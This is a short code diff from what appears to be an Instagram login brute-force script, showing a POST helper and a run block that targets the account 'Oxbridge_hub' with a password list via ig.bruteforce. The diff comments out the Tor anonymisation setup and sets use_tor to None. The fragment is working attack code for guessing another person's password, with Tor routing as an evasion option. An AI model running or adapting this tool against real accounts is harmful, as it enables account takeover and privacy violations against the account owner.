@@ -177,7 +177,7 @@ class Instagram():
         head_post = self.get_universal_headers()
         return  self.session.post(url,data = data,headers=head_post, cookies=self.session.cookies).json()
 
-tor = Tor(9876,4949)
-tor.start()
-ig = Instagram("Oxbridge_hub",use_tor=tor)
+#tor = Tor(9876,4949)
+#tor.start()
+ig = Instagram("Oxbridge_hub",use_tor=None)
 ig.bruteforce(3, "test.passlist")
